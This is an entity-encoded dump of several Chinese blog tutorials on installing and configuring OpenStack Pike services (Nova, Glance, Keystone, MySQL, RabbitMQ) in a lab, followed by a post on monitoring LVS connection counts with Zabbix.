&#x2F;etc&#x2F;nova&#x2F;nova.conf[api_database]connection &#x3D; mysql+pymysql:&#x2F;&#x2F;nova:nova@192.168.56.11&#x2F;nova_api[database]connection &#x3D; mysql+pymysql:&#x2F;&#x2F;nova:nova@192.168.56.11&#x2F;nova 配置RabbitMQ 123456vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[DEFAULT]transport_url &#x3D; rabbit:&#x2F;&#x2F;openstack:openstack@192.168.56.11 #配置文件的3128行注：这里调用RabbitMQ集群主节点地址信息 告诉nova使用keystone进行身份认证 123456789101112131415vim &#x2F;etc&#x2F;nova&#x2F;nova.conf[api]auth_strategy &#x3D; keystone[keystone_authtoken]auth_uri &#x3D; http:&#x2F;&#x2F;192.168.56.11:5000auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357memcached_servers &#x3D; 192.168.56.11:11211auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultproject_name &#x3D; serviceusername &#x3D; novapassword &#x3D; nova Nova其他一些配置 配置控制节点的管理IP地址 12[DEFAULT]my_ip &#x3D; 192.168.56.11 关闭Nova防火墙-后边使用neutron防火墙 123456789[DEFAULT]use_neutron &#x3D; truefirewall_driver &#x3D; nova.virt.firewall.NoopFirewallDriver #关闭Nova的防火墙默认情况下Computer使用内部防火墙驱动程序，因此需要把Nova的防火墙给关闭另外，这个防火墙关闭配置可以在这个路径下查找配置字段:vim &#x2F;usr&#x2F;lib&#x2F;python2.7&#x2F;site-packages&#x2F;nova&#x2F;virt&#x2F;firewall.py搜索：“NoopFireDriver”就能找到该字段 将vnc代理配置为控制节点的管理接口IP地址 1234[vnc]enabled &#x3D; truevncserver_listen &#x3D; 192.168.56.11 #vncserver的监听地址vncserver_proxyclient_address &#x3D; 192.168.56.11 配置glance 12[glance]api_servers &#x3D; http:&#x2F;&#x2F;192.168.56.11:9292 配置锁路径 12[oslo_concurrency]lock_path &#x3D; &#x2F;var&#x2F;lib&#x2F;nova&#x2F;tmp 配置Placement API 123456789[placement]os_region_name &#x3D; RegionOneproject_domain_name &#x3D; Defaultproject_name &#x3D; serviceauth_type &#x3D; passworduser_domain_name &#x3D; Defaultauth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357&#x2F;v3username &#x3D; placementpassword &#x3D; placement 官方bug解决 12345678910111213141516vim &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;00-nova-placement-api.conf #在&lt;VirtualHost&gt;......&lt;&#x2F;VirtualHost&gt;字段内添加如下代码：&lt;Directory &#x2F;usr&#x2F;bin&gt; &lt;IfVersion &gt;&#x3D; 2.4&gt; Require all granted &lt;&#x2F;IfVersion&gt; &lt;IfVersion &lt; 2.4&gt; Order allow,deny Allow from all &lt;&#x2F;IfVersion&gt;&lt;&#x2F;Directory&gt;重启服务systemctl restart httpd 同步数据库123456789101112同步nova-apisu -s &#x2F;bin&#x2F;sh -c &quot;nova-manage api_db sync&quot; nova注册cell0数据库su -s &#x2F;bin&#x2F;sh -c &quot;nova-manage cell_v2 map_cell0&quot; nova创建cell1单元格su -s &#x2F;bin&#x2F;sh -c &quot;nova-manage cell_v2 create_cell --name&#x3D;cell1 --verbose&quot; nova05ed8bb9-85e5-438a-9ec0-f704df940581同步nova数据库su -s &#x2F;bin&#x2F;sh -c &quot;nova-manage db sync&quot; nova 验证数据库同步 123mysql -unova -pnova -e &quot;use nova_cell0;show tables;&quot;mysql -unova -pnova -e &quot;use nova_api;show tables;&quot;mysql -unova -pnova -e &quot;use nova;show tables;&quot; 验证nova cell0和cell1注册情况 1234567nova-manage cell_v2 list_cells+-------+--------------------------------------+| Name | UUID |+-------+--------------------------------------+| cell1 | 109e1d4b-536a-40d0-83c6-5f121b82b650 || cell0 | 00000000-0000-0000-0000-000000000000 |+-------+--------------------------------------+ 启动 1234567systemctl enable openstack-nova-api.service \\openstack-nova-consoleauth.service openstack-nova-scheduler.service \\openstack-nova-conductor.service openstack-nova-novncproxy.servicesystemctl start openstack-nova-api.service \\openstack-nova-consoleauth.service openstack-nova-scheduler.service \\openstack-nova-conductor.service openstack-nova-novncproxy.service 最后验证nova是否可用 12345678[root@controler ~]# openstack host list+-------------------------+-------------+----------+| Host Name | Service | Zone |+-------------------------+-------------+----------+| controler.openstack.com | consoleauth | internal || controler.openstack.com | conductor | internal || controler.openstack.com | scheduler | internal |+-------------------------+-------------+----------+ 错误解决思路 1查看日志： &#x2F;var&#x2F;log&#x2F;nova&#x2F;nova-*.log 123456789[root@localhost nova]# netstat -lntup Active Internet connections (only servers)Proto Recv-Q Send-Q Local Address Foreign Address State PID&#x2F;Program name tcp 0 0 0.0.0.0:8774 0.0.0.0:* LISTEN 11507&#x2F;python2 tcp 0 0 0.0.0.0:8775 0.0.0.0:* LISTEN 11507&#x2F;python2 注：Nova-API 监听端口：8774; metadate 监听端口：8775；","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"OpenStack","slug":"OpenStack","permalink":"https://garywu520.github.io/tags/OpenStack/"},{"name":"Nova","slug":"Nova","permalink":"https://garywu520.github.io/tags/Nova/"}]},{"title":"OpenStack_Pike-Glance镜像服务4","slug":"OpenStack-Pike-Glance镜像服务4","date":"2018-01-03T12:28:25.000Z","updated":"2018-01-12T12:55:34.287Z","comments":true,"path":"2018/01/03/OpenStack-Pike-Glance镜像服务4/","link":"","permalink":"https://garywu520.github.io/2018/01/03/OpenStack-Pike-Glance%E9%95%9C%E5%83%8F%E6%9C%8D%E5%8A%A14/","excerpt":"1234Glance镜像服务：简单说需要启用2个接口或者说2个进程。Glance-api: 用于接受云系统镜像的创建、删除、读取请求。Glance-Registry: 用于云系统的镜像注册服务。","text":"1234Glance镜像服务：简单说需要启用2个接口或者说2个进程。Glance-api: 用于接受云系统镜像的创建、删除、读取请求。Glance-Registry: 用于云系统的镜像注册服务。 Glance-api功能 12Glance-api在功能上与nova-api十分相似，都是接收REST API请求，然后通过其他模块（glance-registry及image store）来完成诸如镜像的查找、获取、上传、删除等操作。api默认监听端口：9292 Glance-Registry功能 1Glance-Registry用于与MySQL数据库交互，用于存储或获取镜像的元数据（metadata），提供镜像元数据相关的REST接口，通过glance-registry,可以向数据库中写入或获取镜像的各种数据，glance-registry监听端口:9191。Glance的数据库中有两张表，一张是image表，另一张是image property表。image表保存了镜像格式，大小等信息；而image property表则主要保存镜像的定制化信息。 image-store 1image-store是一个存储的接口层，通过这个接口，glance可以获取镜像，image store支持的存储有Amazon的S3，OpenStack本身的swift，还有诸如ceph、sheepdog,GlusterFS等分布式存储。image store是镜像保存与获取的接口，它仅仅是一个接口层，具体的实现需要外部存储的支持。 配置数据库 123CREATE DATABASE glance;grant all privileges on glance.* to &#39;glance&#39;@&#39;%&#39; identified by &#39;glance&#39;;grant all privileges on glance.* to &#39;glance&#39;@localhost identified by &#39;glance&#39;; 创建Glance用户并加入service项目 1source &#x2F;scripts&#x2F;admin-openrc 12345创建glance用户(密码：glance)openstack user create --domain default --password-prompt glance添加glance用户到admin角色和service项目中openstack role add --project service --user glance admin 创建glance服务,类型: image 1openstack service create --name glance --description &quot;OpenStack Image&quot; image 创建image服务 API endpoint 123openstack endpoint create --region RegionOne image public http:&#x2F;&#x2F;192.168.56.11:9292openstack endpoint create --region RegionOne image internal http:&#x2F;&#x2F;192.168.56.11:9292openstack endpoint create --region RegionOne image admin http:&#x2F;&#x2F;192.168.56.11:9292 安装和配置Glance 1yum install -y openstack-glance 配置glance-api.conf 12[database]connection &#x3D; mysql+pymysql:&#x2F;&#x2F;glance:glance@192.168.56.11&#x2F;glance 12345678910111213[keystone_authtoken]auth_uri &#x3D; http:&#x2F;&#x2F;192.168.56.11:5000auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357memcached_servers &#x3D; 192.168.56.11:11211auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultproject_name &#x3D; serviceusername &#x3D; glancepassword &#x3D; glance[paste_deploy]flavor &#x3D; keystone 123456789101112131415161718192021配置glance存储为本地存储(生产可配置ceph或cinder)[glance_store]stores &#x3D; file,httpdefault_store &#x3D; filefilesystem_store_datadir &#x3D; &#x2F;var&#x2F;lib&#x2F;glance&#x2F;images&#x2F;--------------------------------------------------------------Glance镜像存储支持列表Possible values: * file * filesystem * http * https * swift * swift+http * swift+https * swift+config * rbd * sheepdog * cinder * vsphere 配置glance-registry.conf 12[database]connection &#x3D; mysql+pymysql:&#x2F;&#x2F;glance:glance@192.168.56.11&#x2F;glance 12345678910111213[keystone_authtoken]auth_uri &#x3D; http:&#x2F;&#x2F;192.168.56.11:5000auth_url &#x3D; http:&#x2F;&#x2F;192.168.56.11:35357memcached_servers &#x3D; 192.168.56.11:11211auth_type &#x3D; passwordproject_domain_name &#x3D; defaultuser_domain_name &#x3D; defaultproject_name &#x3D; serviceusername &#x3D; glancepassword &#x3D; glance[paste_deploy]flavor &#x3D; keystone 同步数据库 1su -s &#x2F;bin&#x2F;sh -c &quot;glance-manage db_sync&quot; glance 启动服务 123systemctl enable openstack-glance-api.service openstack-glance-registry.servicesystemctl start openstack-glance-api.service openstack-glance-registry.servicesystemctl status openstack-glance-api.service openstack-glance-registry.service 验证端口 1netstat -lntup #查看9292和9191端口是否已经启动 Glance排错 123OpenStack服务组件之间都是通过REST API来访问的，都是基于HTTP协议，所以可以根据HTTP错误请求代码来快速判断故障点并进行修复grep &quot;ERROR&quot; &#x2F;var&#x2F;log&#x2F;glance&#x2F;api.log grep &quot;ERROR&quot; &#x2F;var&#x2F;log&#x2F;glance&#x2F;registry.log 镜像管理 查看空的glance镜像列表 12345[root@controller ~]# glance image-list+----+------+| ID | Name |+----+------++----+------+ 下载一个最小的源镜像 1wget http:&#x2F;&#x2F;download.cirros-cloud.net&#x2F;0.3.4&#x2F;cirros-0.3.4-x86_64-disk.img 上传镜像 1234使用磁盘格式:QCOW2 ，容器格式:bare上传镜像到镜像服务并设置权限为publicopenstack image create &quot;cirros&quot; --file cirros-0.3.4-x86_64-disk.img --disk-format qcow2 --container-format bare --public注：留意返回结果中的镜像ID 确认镜像上传并验证属性 12345678openstack image list+--------------------------------------+--------+--------+| ID | Name | Status |+--------------------------------------+--------+--------+| b0351ef2-b299-4082-ad5e-a7b1ca3353b4 | cirros | active |+--------------------------------------+--------+--------+注：已经active的镜像可用于创建虚拟机 备注： 12345678由glance配置文件可以确定，glance镜像存储路径定义在了&#x2F;var&#x2F;lib&#x2F;glance&#x2F;images目录下。去这里看下[root@localhost]# cd &#x2F;var&#x2F;lib&#x2F;glance&#x2F;images&#x2F; &amp;&amp; ls -l-rw-r----- 1 glance glance 13M Dec 31 22:34 b0351ef2-b299-4082-ad5e-a7b1ca3353b4从返回结果中可以看到它是以镜像ID作为镜像名称来存储的[root@localhost images]# file b0351ef2-b299-4082-ad5e-a7b1ca3353b4 b0351ef2-b299-4082-ad5e-a7b1ca3353b4: QEMU QCOW Image (v2), 41126400 bytes从上面可以看出，镜像格式为： QEMU QCOW2镜像","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"Glance","slug":"Glance","permalink":"https://garywu520.github.io/tags/Glance/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"}]},{"title":"OpenStack_Pike-Keystone认证服务3","slug":"OpenStack-Pike-Keystone认证服务3","date":"2018-01-03T12:23:37.000Z","updated":"2018-03-03T06:14:18.106Z","comments":true,"path":"2018/01/03/OpenStack-Pike-Keystone认证服务3/","link":"","permalink":"https://garywu520.github.io/2018/01/03/OpenStack-Pike-Keystone%E8%AE%A4%E8%AF%81%E6%9C%8D%E5%8A%A13/","excerpt":"keystone认证服务 123功能: 1. 账号管理, admin和user 提供用户管理认证2. 提供服务目录,然后其他服务来keystone进行注册。用户访问过来通过keystone去找glance&#x2F;neutron等等。","text":"keystone认证服务 123功能: 1. 账号管理, admin和user 提供用户管理认证2. 提供服务目录,然后其他服务来keystone进行注册。用户访问过来通过keystone去找glance&#x2F;neutron等等。 keystone角色概念 12345Role即角色，Roles代表一组用户可以访问的资源权限，例如Nova中的虚拟机、Glance中的镜像Users 可以被添加到任意一个全局的或项目内的角色中。在全局的Role中，用户的Role权限作用于所有的项目，即可以对所有的项目执行Role规定的权限；在项目内的Role中,用户仅能在当前租户内执行Role规定的权限。 keystone的service和endpoint端点概念 123456Service: 即服务实体，如Nova、Glance、Swift。所有的服务就需要在keystone中创建一个账户Endpoint，翻译为“端点”，我们可以理解它是一个服务暴露出来的访问点。如果需要访问一个服务，则必须知道它的endpoint。Endpoint的每个URL都对应一个服务实例的访问地址，并且具有三种不同权限：admin，internal和public。其中public url可以被全局访问，internal url只能被内部(局域网)访问，admin url被从常规的访问中分离。 为什么分为三个URL？可以试想下，如果机器上有三个IP地址的话，公网可以使用public url,内网地址可以使用internal url, 如果有个网络专门作为管理使用，可以配置为admin url。公有云也有类似的API，公共的即public API等等 创建keystone数据库 123CREATE DATABASE keystone;grant all privileges on keystone.* to &#39;keystone&#39;@&#39;%&#39; identified by &#39;keystone&#39;;grant all privileges on keystone.* to &#39;keystone&#39;@localhost identified by &#39;keystone&#39;; 安装部署Keystone 1yum install -y openstack-keystone httpd mod_wsgi 配置keystone 1vim &#x2F;etc&#x2F;keystone&#x2F;keystone.conf 1234配置keystone连接到mysql[database]connection &#x3D; mysql+pymysql:&#x2F;&#x2F;keystone:keystone@192.168.56.11&#x2F;keystone 1234配置令牌提供程序[token]provider &#x3D; fernet 同步keystone数据库 1su -s &#x2F;bin&#x2F;sh -c &quot;keystone-manage db_sync&quot; keystone 初始化Fernet密钥库 1234keystone-manage fernet_setup --keystone-user keystone --keystone-group keystonekeystone-manage credential_setup --keystone-user keystone --keystone-group keystone初始化完成后，&#x2F;etc&#x2F;keystone目录下就会出现“fernet-keys”和“credential-keys”目录 初始化引导身份认证服务 1234567密码使用adminkeystone-manage bootstrap --bootstrap-password admin \\ --bootstrap-admin-url http:&#x2F;&#x2F;192.168.56.11:35357&#x2F;v3&#x2F; \\ --bootstrap-internal-url http:&#x2F;&#x2F;192.168.56.11:5000&#x2F;v3&#x2F; \\ --bootstrap-public-url http:&#x2F;&#x2F;192.168.56.11:5000&#x2F;v3&#x2F; \\ --bootstrap-region-id RegionOne 配置Apache HTTP服务器 123vim &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf #修改ServerNameServerName 192.168.56.11 12软链配置文件ln -s &#x2F;usr&#x2F;share&#x2F;keystone&#x2F;wsgi-keystone.conf &#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F; 123启动Apachesystemctl enable httpd.servicesystemctl start httpd.service 启动验证 123456查看端口ss -lntup #检查是否有keystone的5000和35357端口，是否有memcached的11211端口查keystone启动日志less &#x2F;var&#x2F;log&#x2F;keystone&#x2F;keystone.logtailf &#x2F;var&#x2F;log&#x2F;keystone&#x2F;keystone.log 故障排查 1234如果keystone启动失败，需要修改配置文件&#x2F;etc&#x2F;keystone&#x2F;keystone.conf 开启debug日志输出模式将“#debug &#x3D; false” 改为“debug &#x3D; true”注：keystone依赖memcache和mysql,可以根据错误日志输出，查看具体故障并进行修复。 创建一个服务项目 配置管理账户(其中密码是刚才定义的admin) 1234567export OS_USERNAME&#x3D;adminexport OS_PASSWORD&#x3D;admin export OS_PROJECT_NAME&#x3D;adminexport OS_USER_DOMAIN_NAME&#x3D;Defaultexport OS_PROJECT_DOMAIN_NAME&#x3D;Defaultexport OS_AUTH_URL&#x3D;http:&#x2F;&#x2F;192.168.56.11:35357&#x2F;v3export OS_IDENTITY_API_VERSION&#x3D;3 1234567891011121314创建名为service项目(目的：让所需的glance&#x2F;nova等服务注册到service项目中)openstack project create --domain default --description &quot;Service Project&quot; service创建名为demo项目(创建虚拟机时使用)openstack project create --domain default --description &quot;Demo Project&quot; demo创建一个demo用户openstack user create --domain default --password-prompt demo创建一个user角色openstack role create user把demo用户同时加入到user角色和demo项目中openstack role add --project demo --user demo user 验证配置 1unset OS_AUTH_URL OS_PASSWORD 临时取消环境变量 使用admin用户来验证token 12345openstack --os-auth-url http:&#x2F;&#x2F;192.168.56.11:35357&#x2F;v3 \\ --os-project-domain-name Default --os-user-domain-name Default \\ --os-project-name admin --os-username admin token issue 根据提示输入admin用户密码(密码是上面配置的admin)即可出现token 使用demo用户来验证token 12345openstack --os-auth-url http:&#x2F;&#x2F;192.168.56.11:5000&#x2F;v3 \\ --os-project-domain-name Default --os-user-domain-name Default \\ --os-project-name demo --os-username demo token issue根据提示输入密码demo即可出现token 创建环境变量脚本 创建admin的环境变量脚本 vim /scripts/admin-openrc 12345678export OS_PROJECT_DOMAIN_NAME&#x3D;Defaultexport OS_USER_DOMAIN_NAME&#x3D;Defaultexport OS_PROJECT_NAME&#x3D;adminexport OS_USERNAME&#x3D;adminexport OS_PASSWORD&#x3D;adminexport OS_AUTH_URL&#x3D;http:&#x2F;&#x2F;192.168.56.11:35357&#x2F;v3export OS_IDENTITY_API_VERSION&#x3D;3export OS_IMAGE_API_VERSION&#x3D;2 创建demo的环境变量脚本 vim /scripts/demo-openrc 12345678export OS_PROJECT_DOMAIN_NAME&#x3D;Defaultexport OS_USER_DOMAIN_NAME&#x3D;Defaultexport OS_PROJECT_NAME&#x3D;demoexport OS_USERNAME&#x3D;demoexport OS_PASSWORD&#x3D;demoexport OS_AUTH_URL&#x3D;http:&#x2F;&#x2F;192.168.56.11:5000&#x2F;v3export OS_IDENTITY_API_VERSION&#x3D;3export OS_IMAGE_API_VERSION&#x3D;2 使用环境变量脚本 123source &#x2F;scripts&#x2F;admin-openrc 或source &#x2F;scripts&#x2F;demo-openrc 验证 12不论使用哪个环境变量，只要出现对应token结果就OKopenstack token issue","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"},{"name":"Keystone","slug":"Keystone","permalink":"https://garywu520.github.io/tags/Keystone/"}]},{"title":"OpenStack_Pike-基础服务安装2","slug":"OpenStack-Pike-基础服务安装2","date":"2018-01-03T12:21:05.000Z","updated":"2018-01-14T05:02:47.335Z","comments":true,"path":"2018/01/03/OpenStack-Pike-基础服务安装2/","link":"","permalink":"https://garywu520.github.io/2018/01/03/OpenStack-Pike-%E5%9F%BA%E7%A1%80%E6%9C%8D%E5%8A%A1%E5%AE%89%E8%A3%852/","excerpt":"OpenStack历史发行版说明 OpenStack Releases版本发行说明","text":"OpenStack历史发行版说明 OpenStack Releases版本发行说明 【控制节点】 安装OpenStack官方源 1234567891011#安装OpenStack源yum install -y centos-release-openstack-pike升级包yum -y upgrade 安装OpenStack客户端yum install -y python-openstackclient安装 openstack-selinux包实现对OpenStack服务的安全策略进行自动管理：yum install -y openstack-selinux 编译安装MySQL5.6.36(生产环境可使用MySQL主从) 12345678910111213141516171819#安装依赖包yum groupinstall &quot;Development Tools&quot;yum install ncurses-devel libaio-devel -yrpm -qa ncurses-devel libaio-devel#安装预编译工具cmakeyum install -y cmake#创建用户useradd -s &#x2F;sbin&#x2F;nologin -M mysqlid mysql#官方下载mysql-版本:mysql-5.6.36wget https:&#x2F;&#x2F;cdn.mysql.com&#x2F;archives&#x2F;mysql-5.6&#x2F;mysql-5.6.36.tar.gz#检查md5是否与官方一致md5sum mysql-5.6.36.tar.gz #解压、进入目录编译tar -zxvf mysql-5.6.36.tar.gz &amp;&amp; cd mysql-5.6.36 1234567891011121314151617181920#编译cmake . -DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.6.36 \\-DMYSQL_DATADIR&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F;data \\-DMYSQL_UNIX_ADDR&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F;data&#x2F;mysql.sock \\-DDEFAULT_CHARSET&#x3D;utf8 \\-DDEFAULT_COLLATION&#x3D;utf8_general_ci \\-DWITH_EXTRA_CHARSETS&#x3D;all \\-DWITH_INNOBASE_STORAGE_ENGINE&#x3D;1 \\-DWITH_FEDERATED_STORAGE_ENGINE&#x3D;1 \\-DWITH_BLACKHOLE_STORAGE_ENGINE&#x3D;1 \\-DWITHOUT_EXAMPLE_STORAGE_ENGINE&#x3D;1 \\-DWITH_ZLIB&#x3D;bundled \\-DWITH_SSL&#x3D;bundled \\-DENABLED_LOCAL_INFILE&#x3D;1 \\-DWITH_EMBEDDED_SERVER&#x3D;1 \\-DENABLE_DOWNLOADS&#x3D;1 \\-DWITH_DEBUG&#x3D;0make &amp;&amp; make installln -s &#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F; &#x2F;usr&#x2F;local&#x2F;mysql 设置“bind-address”值为控制节点的管理网络IP地址和字符集等 1234567891011\\cp support-files&#x2F;my*.cnf &#x2F;etc&#x2F;my.cnf创建并编辑&#x2F;etc&#x2F;my.cnf.d&#x2F;openstack.cnf[mysqld]bind-address &#x3D; 10.0.10.11 #设置监听IP地址或0.0.0.0default-storage-engine &#x3D; innodbinnodb_file_per_table &#x3D; onmax_connections &#x3D; 4096collation-server &#x3D; utf8_general_cicharacter-set-server &#x3D; utf8 初始化 123456789101112#初始化mysql&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;scripts&#x2F;mysql_install_db --basedir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F; --datadir&#x3D;&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data --user&#x3D;mysqlchown -R mysql.mysql &#x2F;usr&#x2F;local&#x2F;mysql&#x2F;cp support-files&#x2F;mysql.server &#x2F;etc&#x2F;init.d&#x2F;mysqldchmod 700 &#x2F;etc&#x2F;init.d&#x2F;mysqldchkconfig mysqld onchkconfig --list mysqldmkdir -p &#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F;data #创建mysql socket存放目录chown -R mysql:mysql &#x2F;usr&#x2F;local&#x2F;mysql-5.6.36&#x2F;data #修改目录权限&#x2F;etc&#x2F;init.d&#x2F;mysqld startnetstat -lntup |grep 3306 设置密码并清理无用数据库 123配置环境变量echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&quot; &gt;&gt;&#x2F;etc&#x2F;profilesource &#x2F;etc&#x2F;profile 12mysqladmin -u root -p password &#39;123456&#39;mysql -uroot -p123456 12345mysql&gt; drop user &#39;&#39;@&#39;localhost&#39;;mysql&gt; drop user &#39;&#39;@&#39;localhost.localdomain&#39;;mysql&gt; drop user &#39;root&#39;@&#39;127.0.0.1&#39;;mysql&gt; drop user &#39;root&#39;@&#39;::1&#39;;mysql&gt; drop database test; 配置RabbitMQ(在OpenStack架构中是交通枢纽的一个作用) 这里使用外部RabbitMQ集群,参考:RabbitMQ集群部署 集群信息 12345RabbitMQ集群主节点：10.0.10.21:5672RabbitMQ Web Management: http:&#x2F;&#x2F;10.0.10.21:15672账户密码：openstack注：Web页面底部有个HTTP API，zabbix可以通过这个API来监控RabbitMQ 123 生产环境需要配置集群，否则后期将成为瓶颈注: 如果RabbitMQ无法启动，则需要检查hosts域名解析 阶段总结1MySQL和RabbitMQ都属于基础服务，基础服务是务必做高可用的，如果RabbitMQ基础服务Down了，会直接影响到OpenStack创建新的虚拟机，但是已经在运行的虚拟机，是不受影响的。","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"}]},{"title":"OpenStack_Pike-实验环境准备1","slug":"OpenStack-Pike-实验环境准备1","date":"2018-01-03T12:17:31.000Z","updated":"2018-01-12T05:37:41.189Z","comments":true,"path":"2018/01/03/OpenStack-Pike-实验环境准备1/","link":"","permalink":"https://garywu520.github.io/2018/01/03/OpenStack-Pike-%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%871/","excerpt":"环境准备","text":"环境准备 注:以下是两台ESXI虚拟机，需要将所有计算节点配置虚拟机支持cpu虚拟化 123456789101112(1)服务器准备(并配置hosts,目的：给RabbitMQ使用，中途变更解析将会出错)10.0.10.11 controler 控制节点10.0.10.12 computer 计算节点(2)硬件配置CPU开启硬件虚拟化(3)操作系统:CentOS7(4)系统安装过程中，将网卡改为eth0 引导菜单，按Tab键，在后面输入 “net.ifnames&#x3D;0 biosdevname&#x3D;0” 系统初始化 123456789101112131415161718192021关闭SELINUX[root@localhost ~]# grep &quot;SELINUX&#x3D;disabled&quot; &#x2F;etc&#x2F;selinux&#x2F;configSELINUX&#x3D;disabled关闭Firewalldsystemctl disable firewalld.service安装基础软件yum install -y vim wget lrzsz ntpdate -y更换yum源(1)采用清华大学镜像：https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;help&#x2F;centos&#x2F;(2)Epel源：https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;help&#x2F;epel&#x2F;更新时间(生产环境可配置ntp服务器)\\cp &#x2F;usr&#x2F;share&#x2F;zoneinfo&#x2F;Asia&#x2F;Shanghai &#x2F;etc&#x2F;localtime[root@localhost ~]# crontab -l*&#x2F;5 * * * * &#x2F;usr&#x2F;sbin&#x2F;ntpdate -u ntp1.aliyun.com升级系统并重启yum update -y &amp;&amp; reboot 创建快照 1关机创建快照","categories":[],"tags":[{"name":"高级运维","slug":"高级运维","permalink":"https://garywu520.github.io/tags/%E9%AB%98%E7%BA%A7%E8%BF%90%E7%BB%B4/"},{"name":"openstack","slug":"openstack","permalink":"https://garywu520.github.io/tags/openstack/"}]},{"title":"细说-LVS中ActiveConn和InActConn","slug":"细说-LVS中ActiveConn和InActConn","date":"2018-01-02T08:40:13.000Z","updated":"2018-07-17T06:44:33.556Z","comments":true,"path":"2018/01/02/细说-LVS中ActiveConn和InActConn/","link":"","permalink":"https://garywu520.github.io/2018/01/02/%E7%BB%86%E8%AF%B4-LVS%E4%B8%ADActiveConn%E5%92%8CInActConn/","excerpt":"目标需求1监控DNS LVS(udp协议)每秒共处理多少个请求，力求数值准确。","text":"目标需求1监控DNS LVS(udp协议)每秒共处理多少个请求，力求数值准确。 需求分解12345678910111213141516171819201. ipvsadm命令结果含义 对于TCP协议而言，ActiveConn列是活动连接数,也就是tcp连接状态的ESTABLISHED，而InActConn列是指除了ESTABLISHED以外的,所有的其它状态的tcp连接.2. 已知的问题 默认情况下，LVS看到的连接数比实际使用netstat看到的连接数要高，就会导致对结果的误判。3. 问题原因：LVS自身有超时时间概念，默认如下: #ipvsadm -Ln --timeout Timeout (tcp tcpfin udp): 900 120 300 意思是当一条连接经过LVS后，不管这条连接是不是已经失效，如果是tcp连接，lvs会把这个连接记录保存15分钟；如果是tcpfin状态连接，保存2分钟；如果是udp连接，连接记录则保存5分钟。所以，所以如果是tcp业务，在15分钟内有大量的并发请求连进来的时候,你就会看到ActiveConn这个数值直线上升。4. 问题解决方案 本次计划监控DNS LVS，即UDP连接。故需要调整LVS UDP的超时时间，原理是限定每秒一个请求的实际处理时间，来实现LVS的连接数与netstat看到的连接数基本一致。 如：#ipvsadm --set 180 180 10(表示每个DNS UDP的连接超时时间设置10秒(不合适可调整)，TCP相关超时设置忽略即可)5. 问题解决方案验证 已经过验证6. zabbix key值编写+监控 重新编写自定义key，来实现需求。 1234567附加： 如何查看linux系统中当前所有（包括TCP和UDP）连接？# netstat -n | awk &#39;&#x2F;^tcp&#x2F; &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;&#39;CLOSE_WAIT 2091ESTABLISHED 637FIN_WAIT2 11TIME_WAIT 89 zabbix 监控DNS LVS 实现zabbix客户端配置-自定义key123vim &#x2F;etc&#x2F;zabbix&#x2F;zabbix_agentd.conf#LVS监控UserParameter&#x3D;dns-lvs[*],&#x2F;var&#x2F;zabbix&#x2F;lvs&#x2F;lvs_conn_status.sh $1 创建目录和权限1234mkdir -p &#x2F;var&#x2F;zabbix&#x2F;lvstouch &#x2F;var&#x2F;zabbix&#x2F;lvs&#x2F;lvs_conn_status.shchmod +x &#x2F;var&#x2F;zabbix&#x2F;lvs&#x2F;lvs_conn_status.shchown -R zabbix.zabbix &#x2F;var&#x2F;zabbix&#x2F;lvs&#x2F;lvs_conn_status.sh 编写监控脚本1234567891011121314151617181920#!&#x2F;bin&#x2F;bash131_InActConn () &#123; sudo &#x2F;sbin&#x2F;ipvsadm -Ln|awk &quot;NR&#x3D;&#x3D;5&quot;|awk &#39;&#123;print $6&#125;&#39;&#125;132_InActConn () &#123; sudo &#x2F;sbin&#x2F;ipvsadm -Ln|awk &quot;NR&#x3D;&#x3D;6&quot;|awk &#39;&#123;print $6&#125;&#39;&#125;149_InActConn () &#123; sudo &#x2F;sbin&#x2F;ipvsadm -Ln|awk &quot;NR&#x3D;&#x3D;7&quot;|awk &#39;&#123;print $6&#125;&#39;&#125;a&#x3D;&#96;131_InActConn&#96;b&#x3D;&#96;132_InActConn&#96;c&#x3D;&#96;149_InActConn&#96;AllInConn () &#123; r&#x3D;&#96;expr $a + $b + $c&#96; echo $r&#125;$1 给zabbix账号sudo权限1234echo &#39;Defaults:zabbix !requiretty&#39; &gt;&gt;&#x2F;etc&#x2F;sudoersecho &#39;zabbix ALL&#x3D;(ALL) NOPASSWD:&#x2F;sbin&#x2F;ipvsadm&#39; 